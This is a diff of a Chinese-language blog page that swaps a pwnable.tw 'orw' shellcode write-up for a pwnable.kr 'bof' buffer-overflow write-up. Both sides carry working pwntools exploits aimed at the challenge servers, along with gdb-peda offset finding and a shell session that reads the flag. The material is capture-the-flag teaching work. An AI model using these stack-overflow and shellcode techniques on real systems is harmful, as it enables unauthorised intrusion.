@@ -4,24 +4,24 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>pwnable.tw之orw解析 | Reshahar的博客</title>
+    <title>pwnable.kr之bof | Reshahar的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Reshahar">
     
 
     
-    <meta name="description" content="pwnable.tw 上的第二道题，考察的就是shellcode的编写（汇编代码）能力">
-<meta name="keywords" content="pwn,other,asm_program">
+    <meta name="description" content="pwnable.kr 上的第三道题">
+<meta name="keywords" content="pwn,pwnable.kr">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.tw之orw解析">
-<meta property="og:url" content="http://Reshahar.github.io/2017/05/20/pwnable-tw-orw解析/index.html">
+<meta property="og:title" content="pwnable.kr之bof">
+<meta property="og:url" content="http://Reshahar.github.io/2017/05/25/pwnable-kr-bof/index.html">
 <meta property="og:site_name" content="Reshahar的博客">
-<meta property="og:description" content="pwnable.tw 上的第二道题，考察的就是shellcode的编写（汇编代码）能力">
-<meta property="og:updated_time" content="2017-05-20T14:08:38.000Z">
+<meta property="og:description" content="pwnable.kr 上的第三道题">
+<meta property="og:updated_time" content="2017-05-26T13:49:59.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.tw之orw解析">
-<meta name="twitter:description" content="pwnable.tw 上的第二道题，考察的就是shellcode的编写（汇编代码）能力">
+<meta name="twitter:title" content="pwnable.kr之bof">
+<meta name="twitter:description" content="pwnable.kr 上的第三道题">
 
     
     <link rel="alternative" href="/atom.xml" title="Reshahar的博客" type="application/atom+xml">
@@ -82,14 +82,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/05/20/pwnable-tw-orw解析/" title="pwnable.tw之orw解析" itemprop="url">pwnable.tw之orw解析</a>
+      <a href="/2017/05/25/pwnable-kr-bof/" title="pwnable.kr之bof" itemprop="url">pwnable.kr之bof</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/" title="Reshahar" target="_blank" itemprop="author">Reshahar</a>
 		
   <p class="article-time">
-    <time datetime="2017-05-20T03:00:37.000Z" itemprop="datePublished"> 发表于 2017-05-20</time>
+    <time datetime="2017-05-25T03:31:36.000Z" itemprop="datePublished"> 发表于 2017-05-25</time>
       
      &nbsp
      <span id="busuanzi_container_page_pv" style="display:none">
@@ -103,100 +103,127 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-序"><span class="toc-number">1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-总结"><span class="toc-number">3.</span> <span class="toc-text">0x02 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-参考"><span class="toc-number">4.</span> <span class="toc-text">0x03 参考</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-bof分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 bof分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-总结"><span class="toc-number">2.</span> <span class="toc-text">0x00 总结</span></a></li></ol>
 		
 		</div>
 		
-		<p>pwnable.tw 上的第二道题，考察的就是shellcode的编写（汇编代码）能力</p>
+		<p>pwnable.kr 上的第三道题</p>
 <hr>
 <a id="more"></a>
-<h3 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h3><p>这个题没有什么弯路，就是看你自己shellcode和汇编的能力</p>
-<p>题目相关文件：<a href="https://github.com/Reshahar/BlogFile/tree/master/pwnable.tw-orw" target="_blank" rel="external">https://github.com/Reshahar/BlogFile/tree/master/pwnable.tw-orw</a></p>
-<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>首先还是使用IDA看一下程序，代码如下</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+<h3 id="0x00-bof分析"><a href="#0x00-bof分析" class="headerlink" title="0x00 bof分析"></a>0x00 bof分析</h3><p>相关题目文件:<a href="https://github.com/Reshahar/BlogFile/tree/master/pwnable.kr-bof" target="_blank" rel="external">https://github.com/Reshahar/BlogFile/tree/master/pwnable.kr-bof</a></p>
+<p>使用IDA分析源代码，主要函数func</p>
+<pre><code>int __cdecl func(int a1)
 {
-int v4; // [sp+4h] [bp-4h]@0
-int savedregs; // [sp+8h] [bp+0h]@0
-int savedregs_4; // [sp+Ch] [bp+4h]@0
+char s; // [sp+1Ch] [bp-2Ch]@1
+int v3; // [sp+3Ch] [bp-Ch]@1
 
-orw_seccomp();
-printf(&quot;Give my your shellcode:&quot;);
-read(0, &amp;shellcode, 0xC8u);
-((void (__stdcall *)(int, int, int))shellcode)(v4, savedregs, savedregs_4);
-return 0;
+v3 = *MK_FP(__GS__, 20);
+puts(&quot;overflow me : &quot;);
+gets(&amp;s);
+if ( a1 == 0xCAFEBABE )
+    system(&quot;/bin/sh&quot;);
+else
+    puts(&quot;Nah..&quot;);
+return *MK_FP(__GS__, 20) ^ v3;
 }
-</code></pre><p>程序的功能就是让你放置shellcode然后执行，而pwnable.tw上说了只能使用orw(open，read，write)函数去读去 “/home/orw/flag” 的内容，直接写汇编可能有点难度，所以还是先用C语言实现一下，然后参考C语言的流程再用汇编实现，可能更好，当然如果你的汇编能力极强可以直接写</p>
-<p>我写的C语言程序如下：</p>
-<pre><code>//在/home/orw/下创建flag文件
-#include &lt;unistd.h&gt;  
-#include &lt;stdio.h&gt;
-#include &lt;fcntl.h&gt;  
-
-int main()
-{
-    int fd;
-    char buf[100]={0};
-    fd = open(&quot;/home//orw//flag&quot;,0,0);
-
-    read(fd,buf,100);
-
-    write(1,buf,100);
-
-    close(fd);
-}
-</code></pre><p>编译运行，结果如下</p>
-<pre><code>root@kali:~/D/other/asm_program/pwnable.tw-orw# ./test
-FLAG{123123}
-</code></pre><p>然后就使用汇编实现了，c语言调用函数不适合汇编，汇编编写的时候要用int 0x80系统调用</p>
-<pre><code>sys_read    调用号3
-sys_write   调用号4
-sys_open    调用号5
-</code></pre><p>使用pwntools的asm功能，完整的exp如下：</p>
+</code></pre><p>源代码也很简单，很明了，让a1等于0xCAFEBABE就直接执行shell，而a1是func的参数，参数是在栈上保存的，在之前输入的字符s存在溢出可以覆盖a1的值</p>
+<p>首先确定a1的偏移，使用peda生成畸形字符串</p>
+<pre><code>gdb-peda$ pattern create 100 
+&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&apos;
+</code></pre><p>反编译找到func找到比较的地方，在比较的地方下断点</p>
+<pre><code>0x00000654 &lt;+40&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
+.....
+0x00000689 &lt;+93&gt;:    ret
+gdb-peda$ b *0x00000654
+Breakpoint 1 at 0x654
+gdb-peda$ r
+Starting program: /root/D/stack overflow/pwnable.kr-bof/bof 
+Warning:
+Cannot insert breakpoint 1.
+Cannot access memory at address 0x654
+</code></pre><p>可以看到程序直接结束的，我们在func开始的地方下断点，然后取消之前的断点</p>
+<pre><code>gdb-peda$ b func 
+Breakpoint 2 at 0x56555632
+gdb-peda$ info b
+Num     Type           Disp Enb Address    What
+1       breakpoint     keep y   0x00000654 
+2       breakpoint     keep y   0x56555632 &lt;func+6&gt;
+gdb-peda$ delete 1
+gdb-peda$ r
+Starting program: /root/D/stack overflow/pwnable.kr-bof/bof 
+...
+Breakpoint 2, 0x56555632 in func ()
+gdb-peda$ 
+gdb-peda$ disass func 
+Dump of assembler code for function func:
+0x5655562c &lt;+0&gt;:    push   ebp
+0x5655562d &lt;+1&gt;:    mov    ebp,esp
+0x5655562f &lt;+3&gt;:    sub    esp,0x48
+=&gt; 0x56555632 &lt;+6&gt;:    mov    eax,gs:0x14
+0x56555638 &lt;+12&gt;:    mov    DWORD PTR [ebp-0xc],eax
+0x5655563b &lt;+15&gt;:    xor    eax,eax
+0x5655563d &lt;+17&gt;:    mov    DWORD PTR [esp],0x5655578c
+0x56555644 &lt;+24&gt;:    call   0xf7e6fd00 &lt;puts&gt;
+0x56555649 &lt;+29&gt;:    lea    eax,[ebp-0x2c]
+0x5655564c &lt;+32&gt;:    mov    DWORD PTR [esp],eax
+0x5655564f &lt;+35&gt;:    call   0xf7e6f480 &lt;gets&gt;
+0x56555654 &lt;+40&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
+0x5655565b &lt;+47&gt;:    jne    0x5655566b &lt;func+63&gt;
+0x5655565d &lt;+49&gt;:    mov    DWORD PTR [esp],0x5655579b
+0x56555664 &lt;+56&gt;:    call   0xf7e49360 &lt;system&gt;
+0x56555669 &lt;+61&gt;:    jmp    0x56555677 &lt;func+75&gt;
+0x5655566b &lt;+63&gt;:    mov    DWORD PTR [esp],0x565557a3
+0x56555672 &lt;+70&gt;:    call   0xf7e6fd00 &lt;puts&gt;
+0x56555677 &lt;+75&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+0x5655567a &lt;+78&gt;:    xor    eax,DWORD PTR gs:0x14
+0x56555681 &lt;+85&gt;:    je     0x56555688 &lt;func+92&gt;
+0x56555683 &lt;+87&gt;:    call   0xf7f05270 &lt;__stack_chk_fail&gt;
+0x56555688 &lt;+92&gt;:    leave  
+0x56555689 &lt;+93&gt;:    ret    
+End of assembler dump.
+gdb-peda$ b* 0x56555654
+Breakpoint 3 at 0x56555654
+gdb-peda$ c
+Continuing.
+overflow me : 
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+....
+Breakpoint 3, 0x56555654 in func ()
+gdb-peda$ x/wx $ebp+0x8
+0xffffd400:    0x41474141
+gdb-peda$ pattern offset 0x41474141
+1095188801 found at offset: 52
+</code></pre><p>偏移确定了52，用pwntools直接写exp，如下</p>
 <pre><code>#filename:exp.py
-#author: reshahar
-
+#author:reshahar
 from pwn import *
-#p = process(&apos;./orw&apos;)
-p = remote(&apos;chall.pwnable.tw&apos;,10001)
 
-sh =  asm(&apos;sub esp,100&apos;)    
-sh += asm(&apos;xor ecx,ecx&apos;)
-sh += asm(&apos;xor edx,edx&apos;)
-sh += asm(&apos;xor eax,eax&apos;)
-sh += asm(&apos;xor ebx,ebx&apos;)
-sh += asm(&apos;push ecx&apos;)
-sh += asm(&apos;push 0x67616c66&apos;)        #string &apos;/home//orw//flag&apos;
-sh += asm(&apos;push 0x2f2f7772&apos;)
-sh += asm(&apos;push 0x6f2f2f65&apos;)
-sh += asm(&apos;push 0x6d6f682f&apos;)
-sh += asm(&apos;mov ebx,esp&apos;)
-sh += asm(&apos;mov al,5&apos;)
-sh += asm(&apos;int 0x80&apos;)               #call open()
-sh += asm(&apos;nop&apos;)
-sh += asm(&apos;mov ebx,eax&apos;)
-sh += asm(&apos;mov ecx,esp&apos;)
-sh += asm(&apos;mov edx,60&apos;)
-sh += asm(&apos;mov eax,3&apos;)
-sh += asm(&apos;int 0x80&apos;)               #call read()
-sh += asm(&apos;nop&apos;)
-sh += asm(&apos;mov ebx,1&apos;)
-sh += asm(&apos;mov edx,60&apos;)
-sh += asm(&apos;mov eax,4&apos;)
-sh += asm(&apos;int 0x80&apos;)               #call write()
-sh += asm(&apos;nop&apos;)
-sh += asm(&apos;add esp,120&apos;)            #stack balance 
-sh += asm(&apos;ret&apos;)
+#p = process(&apos;./bof&apos;)
+p = remote(&apos;pwnable.kr&apos;,9000)
+
+sh = &apos;A&apos;*52+p32(0xCAFEBABE)
 
 p.send(sh)
 
-# f = open (&apos;1&apos;,&apos;wb&apos;)
-# f.write(sh)
-
-p.recvuntil(&apos;Give my your shellcode:&apos;)
-
-print p.recv(60)
-</code></pre><h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>调试很重要，如果shellcode不正常，调试就是最好的解决办法，仅靠大脑去推算是不行 </p>
-<h3 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h3><p>[1]:<a href="http://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="external">http://blog.csdn.net/xiaominthere/article/details/17287965</a> Linux系统调用 int 80h int 0x80<br>[2]:<a href="http://lobert.iteye.com/blog/1705861" target="_blank" rel="external">http://lobert.iteye.com/blog/1705861</a> linux c学习笔记—-文件的创建与读写(open,read,write)</p>
+p.interactive()
+</code></pre><p>运行结果，拿下flag</p>
+<pre><code>root@kali:~/D/stack overflow/pwnable.kr-bof# python exp.py 
+[+] Opening connection to pwnable.kr on port 9000: Done
+[*] Switching to interactive mode
+$ id
+$ id
+uid=1008(bof) gid=1008(bof) groups=1008(bof)
+$ ls
+bof
+bof.c
+flag
+log
+log2
+super.pl
+$ cat flag
+daddy, I just pwned a buFFer :)
+$  
+</code></pre><h3 id="0x00-总结"><a href="#0x00-总结" class="headerlink" title="0x00 总结"></a>0x00 总结</h3><p>做题要细心，失败和成功有时只有一丝差别</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -210,7 +237,7 @@ print p.recv(60)
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/other/">other</a><a href="/tags/asm-program/">asm_program</a>
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/pwnable-kr/">pwnable.kr</a>
   </div>
 
 </div>
@@ -219,7 +246,7 @@ print p.recv(60)
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://Reshahar.github.io/2017/05/20/pwnable-tw-orw解析/" data-title="pwnable.tw之orw解析 | Reshahar的博客" data-tsina="null" class="share clearfix">
+	  <div data-url="http://Reshahar.github.io/2017/05/25/pwnable-kr-bof/" data-title="pwnable.kr之bof | Reshahar的博客" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -233,21 +260,13 @@ print p.recv(60)
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2017/05/18/pwnable-rw-start分析与折腾/" title="pwnable.rw之start分析与折腾">
+ <a href="/2017/05/23/pwnable-kr-collision/" title="pwnable.kr之collision">
   <strong>上一篇：</strong><br/>
   <span>
-  pwnable.rw之start分析与折腾</span>
+  pwnable.kr之collision</span>
 </a>
 </div>
 
-
-<div class="next">
-<a href="/2017/05/23/pwnable-kr-fd/"  title="pwnable.kr之fd">
- <strong>下一篇：</strong><br/> 
- <span>pwnable.kr之fd
-</span>
-</a>
-</div>
 
 </nav>
 
@@ -259,7 +278,7 @@ print p.recv(60)
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-序"><span class="toc-number">1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-总结"><span class="toc-number">3.</span> <span class="toc-text">0x02 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-参考"><span class="toc-number">4.</span> <span class="toc-text">0x03 参考</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-bof分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 bof分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-总结"><span class="toc-number">2.</span> <span class="toc-text">0x00 总结</span></a></li></ol>
  
   </div>
 
